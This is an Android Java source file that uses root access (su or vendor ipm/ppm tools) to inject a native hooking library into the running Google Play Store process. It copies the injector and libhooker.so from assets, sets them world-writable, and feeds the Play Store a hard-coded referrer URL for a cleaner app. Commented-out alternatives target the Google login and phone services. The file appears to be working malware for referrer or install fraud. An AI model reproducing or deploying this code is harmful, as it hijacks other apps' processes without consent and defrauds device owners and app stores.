package com.ry.inject;


import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.Context;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;

/**
 * @Title: JNI.java
 * @Description:
 * @author yangbing3@ucweb.com
 * @date 2014-9-26 2:29:06
 */
public class JNI {
    public static final String INJECT_NAME = "inject";
    
    public static final String HOOKER_SO_NAME = "libhooker.so";
 
    private static final String shell(final String cmd, final String wrCmd){
    	Process process = null;
		StringBuffer buffer = new StringBuffer();
		try {
			BufferedReader br = null;

			process = Runtime.getRuntime().exec(cmd);
			if(wrCmd != null){
				DataOutputStream dos = new DataOutputStream(
						process.getOutputStream());
				dos.writeBytes(wrCmd + "\n");
				dos.flush();
				dos.writeBytes("exit\n");
				dos.flush();	
			}
			br = new BufferedReader(new InputStreamReader(
					process.getInputStream()));
			try {

				String line = null;
				while ((line = br.readLine()) != null) {
					buffer.append(line);
				}
			} finally {
				if (br != null) {
					br.close();
				}
			}
			process.waitFor();
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			process.destroy();
		}
		return buffer.toString();
    }
    
	public static final boolean isIpmByRoot() {
		final File ipm = new File("/system/bin/ipm");
		if (ipm.exists() && ipm.canExecute()) {
			final String result = shell("ipm", "echo ok");
			if (result != null && result.contains("ok")) {
				return true;
			}
		}
		return false;
	}
	
	public static final boolean isPpmByRoot() {
		final File ipm = new File("/system/bin/ppm");
		if (ipm.exists() && ipm.canExecute()) {
			final String result = shell("ppm -v", null);
			if (result != null && result.contains("2")) {
				return true;
			}
		}
		return false;
	}
	
	public static final boolean isSuByRoot(){
     	 return (new File("/system/bin/su").canExecute() || new File("/system/xbin/su").canExecute());
	}
    
	public static final int startHook(final Context context){
		return startHook(context, "https://play.google.com/store/apps/details?id=com.quicksys.cleaner&referrer=utm_source%3Dcap%26utm_medium%3Dbanner0512%26utm_term%3D0512");
	}
	
	/*
//		final String pack = "com.android.vending";// GP市场
		 final String pack = "com.google.android.gsf.login";//GP登录
//		final String pack = "com.android.phone";// 电话服务
	 * */
	public synchronized static final int startHook(final Context context, final String url){
		return startHook(context, "com.android.vending", url);
	}
	
	public final static String getStatus(int status){
		switch(status){
		case 0:
			return "APK正在运行,已经注入";
		case 1:
			return "成功";
		case -1:
			return "对应的包未安装";
		case -2:
			return "必要的文件操作失败";
		case -3:
			return "没有权限";
		case -4:
			return "包未运行";
		case -5:
			return "执行异常";
		case -6:
			return "没有帐号";
			default:
				return "未知错误" + status;
			
		}
	}
    /**
     * @category 启动GP注入执行
     * @param context
     * @return:
     * 0:上次还在运行
     * 1:执行OK
     * -1:GP未安装
     * -2:必要文件操作失败
     * -3:没有权限
     * -4:GP未运行
     * -5:执行异常
     * -6:没有帐号
     */
	public synchronized static final int startHook(final Context context, String pack, final String url) {
		try {
			if (null == context.getPackageManager().getApplicationInfo(pack, 0)) {
				return (-1);//
			}
		} catch (Exception e) {
			return (-1);
		}

		final String basePath = context.getFilesDir().getAbsolutePath();
		final File injectPath = new File(basePath, INJECT_NAME);
		final File hookerPath = new File(basePath, HOOKER_SO_NAME);

		try {
			RWUtils.write(
					RWUtils.openStream(JNI.class.getClassLoader(), "assets/"
							+ INJECT_NAME), injectPath);
			RWUtils.write(
					RWUtils.openStream(JNI.class.getClassLoader(), "assets/"
							+ HOOKER_SO_NAME), hookerPath);

			Runtime.getRuntime().exec("chmod 777 " + injectPath);
			Runtime.getRuntime().exec("chmod 777 " + hookerPath);
		} catch (Exception e) {
			return (-2);
		}

		final File[] procs = new File("/proc").listFiles();
		boolean running = false;
		for (File f : procs) {
			String cmd = RWUtils.read(new File(f, "cmdline"), "utf-8");
			if (cmd != null && cmd.trim().equals(pack)) {
				running = true;
				break;
			}
		}
		if (!running) {
			return (-4);
		}
		
		String refAddress;
		if(TextUtils.isEmpty(url)){
			refAddress = "test";
		}else{
			refAddress = url;
		}
//		refAddress = new String(Base64.encode(refAddress.getBytes(), 0));
		refAddress += "\n";
		
		//是否已经注册了
		LocalSocket local = null;
		try{
			local = new LocalSocket();
			local.connect(new LocalSocketAddress("socket." + pack));
			
			OutputStream out = local.getOutputStream();
			out.write(refAddress.getBytes());
			out.flush();
//			out.close();
			
			String res = new String(RWUtils.read(local.getInputStream()));
			if(res.contains("OK")){
				return 0;
			}else if(res.contains("NO")){
				return (-6);
			}
		}catch(Exception e){
//			e.printStackTrace();
		}finally{
			if(local != null){
				try {
					local.close();
				} catch (IOException e) {
				}
			}
		}

		final boolean ipm = isIpmByRoot();
		final boolean ppm = isPpmByRoot();
		final boolean su = isSuByRoot();
		if (ppm || ipm || su) {
			final String cmd = injectPath.getPath() + " " + pack + " "
					+ hookerPath + " hook_entry " + refAddress;
			try {
				if (ipm) {
					shell("ipm", cmd);
				} else if (ppm) {
					final String cmd2 = "ppm =abcdefg= "
							+ context.getFilesDir() + " -c " + cmd;
					Runtime.getRuntime().exec(cmd2).waitFor();

				} else if (su) {
					shell("su", cmd);
				}
				// StringBuffer sb = new StringBuffer();
				// sb.append(" ").append(injectPath);//注入程序
				// sb.append(" ").append(pack);//目标进程名称
				// sb.append(" ").append(hookerPath);//注入代码so
				// sb.append(" ").append("hook_entry");//注入代码入口函数
				// sb.append(" ").append("hahaha");//注入代码入口函数参数
				// commands[2] = sb.toString();
				// System.out.println(commands[2]);
				// ShellUtils.execCommand(commands, true);
				return 1;
			} catch (Exception e) {
				return (-5);
			}
		} else {
			return (-3);
		}
	}
}
